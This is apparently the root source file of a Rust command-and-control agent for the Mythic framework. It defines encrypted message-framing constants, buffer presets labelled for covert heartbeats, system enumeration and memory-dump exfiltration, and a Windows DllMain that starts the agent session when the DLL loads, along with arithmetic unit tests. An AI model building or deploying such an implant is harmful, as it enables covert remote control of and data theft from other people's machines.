extern crate alloc;

pub mod buffer;
pub mod config;
pub mod engine;
pub mod error;
pub mod file;
pub mod protocol;
pub mod sysinfo;
pub mod transfer;

pub use obfstr;

pub mod profiles {
    pub mod crypto;
    pub mod http;
}


// =========================================================================
// 1. 协议物理核心常量 (Protocol Physical & Cryptographic Constants)
// =========================================================================

/// Agent 唯一识别符 UUID 规范长度 (36 字节 ASCII 文本)
pub const UUID_LEN: usize = 36;

/// 密码学对称加密初始向量 IV 长度 (AES-256-CBC 严格要求 16 字节)
pub const IV_LEN: usize = 16;

/// HMAC-SHA256 完整性校验签名 Tag 长度 (SHA-256 摘要 32 字节)
pub const HMAC_LEN: usize = 32;

/// AES 块分组密码长度 (16 字节)
pub const AES_BLOCK_SIZE: usize = 16;

/// PKCS#7 块填充最坏情况开销 (即使刚好对齐也必须补满整块 16 字节)
pub const PKCS7_WORST_PADDING: usize = 16;

/// 协议物理帧头部与防伪尾部固定开销 (UUID 36 + IV 16 + HMAC 32 = 84 字节)
pub const PROTOCOL_HEADER_LEN: usize = UUID_LEN + IV_LEN + HMAC_LEN;

/// 协议物理包固定总安全开销 (头部 84 + PKCS#7 最坏填充 16 = 100 字节)
pub const PROTOCOL_OVERHEAD: usize = PROTOCOL_HEADER_LEN + PKCS7_WORST_PADDING;

/// 密文载荷区最小物理长度 (IV 16 + 最小密文块 16 + HMAC 32 = 64 字节)
pub const MIN_ENCRYPTED_PAYLOAD_LEN: usize = IV_LEN + AES_BLOCK_SIZE + HMAC_LEN;

/// 完整二进制报文最小物理长度 (UUID 36 + 密文载荷区 64 = 100 字节)
pub const MIN_RAW_MESSAGE_LEN: usize = UUID_LEN + MIN_ENCRYPTED_PAYLOAD_LEN;

/// 应用层 JSON 骨架开销默认预估 (150 字节)
pub const DEFAULT_JSON_OVERHEAD: usize = 150;

/// JSON 动态混淆注入 `,"_p":""` 语法骨架字符开销 (8 字节)
pub const PADDING_FIELD_OVERHEAD: usize = 8;

/// 默认最大动态填充抖动上限 (256 字节)
pub const DEFAULT_MAX_JITTER: usize = 256;

// =========================================================================
// 2. 编译期常量计算纯函数 (Compile-Time Const Calculation Functions)
// =========================================================================

/// 校验出网 Base64 预算规格是否合法
#[inline(always)]
pub const fn assert_valid_wire_size(wire_size: usize, json_overhead: usize) {
    assert!(wire_size.is_multiple_of(4), "WIRE_SIZE 必须能被 4 整除以满足 Base64 规范");
    assert!(
        wire_size >= (PROTOCOL_HEADER_LEN + AES_BLOCK_SIZE + PKCS7_WORST_PADDING) * 4 / 3,
        "WIRE_SIZE 过小，无法容纳协议头与最小密文"
    );
    let raw_len = calc_raw_len(wire_size);
    let cipher_len = calc_max_ciphertext_len(raw_len);
    let plaintext_len = cipher_len.saturating_sub(PKCS7_WORST_PADDING);
    assert!(plaintext_len > json_overhead, "明文容量不足以容纳 JSON 骨架开销");
}

/// 计算出网 Base64 对应的二进制物理帧总容量: (wire_size / 4) * 3
#[inline(always)]
pub const fn calc_raw_len(wire_size: usize) -> usize {
    assert!(wire_size.is_multiple_of(4), "WIRE_SIZE 必须能被 4 整除");
    (wire_size / 4) * 3
}

/// 计算指定二进制物理容量下，AES 16 字节对齐的最大密文长度
#[inline(always)]
pub const fn calc_max_ciphertext_len(raw_len: usize) -> usize {
    (raw_len.saturating_sub(PROTOCOL_HEADER_LEN) / AES_BLOCK_SIZE) * AES_BLOCK_SIZE
}

/// 计算指定二进制物理容量下，第一层明文 JSON 物理容量上限
#[inline(always)]
pub const fn calc_max_plaintext_len(raw_len: usize) -> usize {
    calc_max_ciphertext_len(raw_len).saturating_sub(PKCS7_WORST_PADDING)
}

/// 计算留给内层 Base64 的 4 字节向下对齐字符容量
#[inline(always)]
pub const fn calc_b64_aligned_capacity(plaintext_len: usize, json_overhead: usize) -> usize {
    (plaintext_len.saturating_sub(json_overhead) / 4) * 4
}

/// 计算磁盘/管道单次读取上限 (严格向下取整到 3 字节倍数，杜绝内层 Base64 '=' 填充)
#[inline(always)]
pub const fn calc_max_raw_read(plaintext_len: usize, json_overhead: usize) -> usize {
    (calc_b64_aligned_capacity(plaintext_len, json_overhead) / 4) * 3
}

/// 计算动态读取下限 (取最大读取容量的 70%，并向下保证 3 字节对齐)
#[inline(always)]
pub const fn calc_min_raw_read(max_raw_read: usize) -> usize {
    let seventy_percent = (max_raw_read * 7) / 10;
    (seventy_percent / 3) * 3
}

/// 计算明文切片经 PKCS#7 补齐后的长度 (16 字节对齐)
#[inline(always)]
pub const fn calc_padded_len(data_len: usize) -> usize {
    (data_len / AES_BLOCK_SIZE + 1) * AES_BLOCK_SIZE
}

/// 计算封包所需完整的二进制物理帧总长: UUID(36) + IV(16) + Padded(N) + HMAC(32)
#[inline(always)]
pub const fn calc_raw_total(data_len: usize) -> usize {
    PROTOCOL_HEADER_LEN + calc_padded_len(data_len)
}

// =========================================================================
// 3. 协议物理帧候选预设规格 (Physical Wire Size Candidates & Presets)
// =========================================================================

/// 常规隐蔽心跳与轻量短指令出网包上限 (4KB)
pub const WIRE_SIZE_4K: usize = 4 * 1024;
pub const RAW_LEN_4K: usize = calc_raw_len(WIRE_SIZE_4K);
pub const CIPHERTEXT_LEN_4K: usize = calc_max_ciphertext_len(RAW_LEN_4K);
pub const PLAINTEXT_LEN_4K: usize = calc_max_plaintext_len(RAW_LEN_4K);
pub const RAW_READ_4K: usize = calc_max_raw_read(PLAINTEXT_LEN_4K, DEFAULT_JSON_OVERHEAD);

/// 中型任务回显与系统枚举出网包上限 (16KB)
pub const WIRE_SIZE_16K: usize = 16 * 1024;
pub const RAW_LEN_16K: usize = calc_raw_len(WIRE_SIZE_16K);
pub const CIPHERTEXT_LEN_16K: usize = calc_max_ciphertext_len(RAW_LEN_16K);
pub const PLAINTEXT_LEN_16K: usize = calc_max_plaintext_len(RAW_LEN_16K);
pub const RAW_READ_16K: usize = calc_max_raw_read(PLAINTEXT_LEN_16K, DEFAULT_JSON_OVERHEAD);

/// 大文件传输与内存 Dump 分片出网包上限 (64KB)
pub const WIRE_SIZE_64K: usize = 64 * 1024;
pub const RAW_LEN_64K: usize = calc_raw_len(WIRE_SIZE_64K);
pub const CIPHERTEXT_LEN_64K: usize = calc_max_ciphertext_len(RAW_LEN_64K);
pub const PLAINTEXT_LEN_64K: usize = calc_max_plaintext_len(RAW_LEN_64K);
pub const RAW_READ_64K: usize = calc_max_raw_read(PLAINTEXT_LEN_64K, DEFAULT_JSON_OVERHEAD);

// =========================================================================
// 4. 【核心配置开关】全局当前激活缓冲区大小 (Active Buffer Size Knob)
//    在此处直接切换预设（如 WIRE_SIZE_4K 改为 WIRE_SIZE_64K），
//    全工程（包括 protocol.rs、crypto.rs）编译期自动联动推导所有切片容量与栈工作面！
// =========================================================================

/// 全局当前激活的通信与栈缓冲区基准容量 (字节)
///
/// 可选候选预设规格：
/// - `WIRE_SIZE_4K`  (4 * 1024 = 4096 B):  常规隐蔽心跳与轻量短指令出网包 (默认推荐)
/// - `WIRE_SIZE_16K` (16 * 1024 = 16384 B): 中型任务回显与系统枚举出网包
/// - `WIRE_SIZE_64K` (64 * 1024 = 65536 B): 大文件传输与内存 Dump 分片出网包
///
/// 👉 【一键切换说明】：
/// 若想将栈缓冲区从 4KB 切换至 64KB，只需将此处修改为：
/// `pub const BUFFER_SIZE: usize = WIRE_SIZE_64K;`
///
/// 全工程后续在 `protocol.rs`、`crypto.rs`、`buffer.rs` 中引入的常量与工作面类型
/// 将在编译期全部自动级联重算，零需手动更改任何底层数学公式！
pub const BUFFER_SIZE: usize = WIRE_SIZE_4K;

/// 激活网络出网包容量别名 (等价于 BUFFER_SIZE)
pub const ACTIVE_WIRE_SIZE: usize = BUFFER_SIZE;

// =========================================================================
// 5. 激活规格常量与强类型级联衍生 (Active Compile-time Derivations)
// =========================================================================

/// 当前生效的网络 Base64 编码文本输出缓冲区上限 (字节，等于 BUFFER_SIZE)
pub const MAX_B64_LEN: usize = BUFFER_SIZE;

/// 当前生效的加密前二进制物理帧暂存区上限 (字节，等于 BUFFER_SIZE * 3 / 4)
pub const MAX_RAW_LEN: usize = calc_raw_len(BUFFER_SIZE);

/// 当前生效的密文区 16 字节对齐最大值 (字节)
pub const MAX_CIPHERTEXT_LEN: usize = calc_max_ciphertext_len(MAX_RAW_LEN);

/// 当前生效的单切片最大明文净载荷容量 (字节)
pub const MAX_PLAINTEXT_LEN: usize = calc_max_plaintext_len(MAX_RAW_LEN);

/// 当前生效的磁盘/管道原始数据单次读取上限 (字节，严格 3 字节倍数)
pub const MAX_RAW_READ: usize = calc_max_raw_read(MAX_PLAINTEXT_LEN, DEFAULT_JSON_OVERHEAD);

/// 当前生效的强类型配额预算计算器 (基于 Rust 1.94 const generics 编译期求值)
pub type ActiveBudget = buffer::PacketBudget<BUFFER_SIZE>;

/// 常规心跳与轻量命令规格预算计算器
pub type Budget4K = buffer::PacketBudget<WIRE_SIZE_4K>;

/// 中型回显与枚举规格预算计算器
pub type Budget16K = buffer::PacketBudget<WIRE_SIZE_16K>;

/// 大文件传输与内存 Dump 规格预算计算器
pub type Budget64K = buffer::PacketBudget<WIRE_SIZE_64K>;

// =========================================================================
// 6. 激活的纯栈工作面与缓冲区类型 (Active Stack Workspaces & Buffers)
// =========================================================================

/// 当前生效的原始二进制物理帧外包类型
pub type RawBuffer = [u8; MAX_RAW_LEN];

/// 当前生效的 Base64 传输包外包类型
pub type B64Buffer = [u8; MAX_B64_LEN];

/// 当前生效的纯栈工作面容器 (随 ACTIVE_WIRE_SIZE 严格同步联动，0 堆分配)
pub type ActiveStackWorkspace = buffer::StackWorkspace<MAX_RAW_LEN, MAX_B64_LEN>;

/// 默认纯栈工作面别名
pub type DefaultStackWorkspace = ActiveStackWorkspace;

/// 4KB 纯栈工作面容器
pub type StackWorkspace4K = buffer::StackWorkspace<RAW_LEN_4K, WIRE_SIZE_4K>;

/// 16KB 纯栈工作面容器
pub type StackWorkspace16K = buffer::StackWorkspace<RAW_LEN_16K, WIRE_SIZE_16K>;

/// 64KB 纯栈工作面容器
pub type StackWorkspace64K = buffer::StackWorkspace<RAW_LEN_64K, WIRE_SIZE_64K>;

// =========================================================================
// 7. 向后兼容模块别名与多桶调度器重导出
// =========================================================================
pub use protocol as mythic_message_type;
pub use protocol::DynamicBudget;

// =========================================================================
// 8. 动态链接库出口 (Windows DLL Entrypoint)
// =========================================================================
#[cfg(windows)]
#[unsafe(no_mangle)]
#[allow(non_snake_case)]
pub extern "system" fn DllMain(
    _hinst_dll: *mut core::ffi::c_void,
    fdw_reason: u32,
    _lpv_reserved: *mut core::ffi::c_void,
) -> i32 {
    const DLL_PROCESS_ATTACH: u32 = 1;
    if fdw_reason == DLL_PROCESS_ATTACH {
        std::thread::spawn(|| {
            let master_key = crate::config::AgentConfig::master_key();
            let payload_uuid = crate::config::AgentConfig::payload_uuid_bytes();
            if let Ok(mut session) = crate::engine::AgentSession::new(&master_key, &payload_uuid) {
                session.run();
            }
        });
    }
    1
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_root_constants_and_derivations() {
        assert_eq!(UUID_LEN, 36);
        assert_eq!(IV_LEN, 16);
        assert_eq!(HMAC_LEN, 32);
        assert_eq!(AES_BLOCK_SIZE, 16);
        assert_eq!(PKCS7_WORST_PADDING, 16);
        assert_eq!(PROTOCOL_HEADER_LEN, 84);
        assert_eq!(PROTOCOL_OVERHEAD, 100);
        assert_eq!(MIN_ENCRYPTED_PAYLOAD_LEN, 64);
        assert_eq!(MIN_RAW_MESSAGE_LEN, 100);

        // 4K 衍生常量测试
        assert_eq!(WIRE_SIZE_4K, 4096);
        assert_eq!(RAW_LEN_4K, 3072);
        assert_eq!(CIPHERTEXT_LEN_4K, 2976);
        assert_eq!(PLAINTEXT_LEN_4K, 2960);
        assert_eq!(RAW_READ_4K, 2106);
        assert_eq!(RAW_READ_4K % 3, 0);

        // 16K 衍生常量测试
        assert_eq!(WIRE_SIZE_16K, 16384);
        assert_eq!(RAW_LEN_16K, 12288);
        assert_eq!(CIPHERTEXT_LEN_16K, 12192);
        assert_eq!(PLAINTEXT_LEN_16K, 12176);
        assert_eq!(RAW_READ_16K, 9018);
        assert_eq!(RAW_READ_16K % 3, 0);

        // 64K 衍生常量测试
        assert_eq!(WIRE_SIZE_64K, 65536);
        assert_eq!(RAW_LEN_64K, 49152);
        assert_eq!(CIPHERTEXT_LEN_64K, 49056);
        assert_eq!(PLAINTEXT_LEN_64K, 49040);
        assert_eq!(RAW_READ_64K, 36666);
        assert_eq!(RAW_READ_64K % 3, 0);

        // Active 常量联动测试
        assert_eq!(MAX_B64_LEN, ACTIVE_WIRE_SIZE);
        assert_eq!(MAX_RAW_LEN, calc_raw_len(ACTIVE_WIRE_SIZE));
        assert_eq!(MAX_PLAINTEXT_LEN, calc_max_plaintext_len(MAX_RAW_LEN));
        assert_eq!(MAX_RAW_READ, calc_max_raw_read(MAX_PLAINTEXT_LEN, DEFAULT_JSON_OVERHEAD));

        // BUFFER_SIZE 与各子模块重导出校验测试
        assert_eq!(BUFFER_SIZE, ACTIVE_WIRE_SIZE);
        assert_eq!(crate::protocol::BUFFER_SIZE, BUFFER_SIZE);
        assert_eq!(crate::profiles::crypto::BUFFER_SIZE, BUFFER_SIZE);
        assert_eq!(crate::buffer::BUFFER_SIZE, BUFFER_SIZE);

        // Padded length 计算测试
        assert_eq!(calc_padded_len(0), 16);
        assert_eq!(calc_padded_len(15), 16);
        assert_eq!(calc_padded_len(16), 32);
        assert_eq!(calc_raw_total(0), 84 + 16);
        assert_eq!(calc_raw_total(16), 84 + 32);
    }
}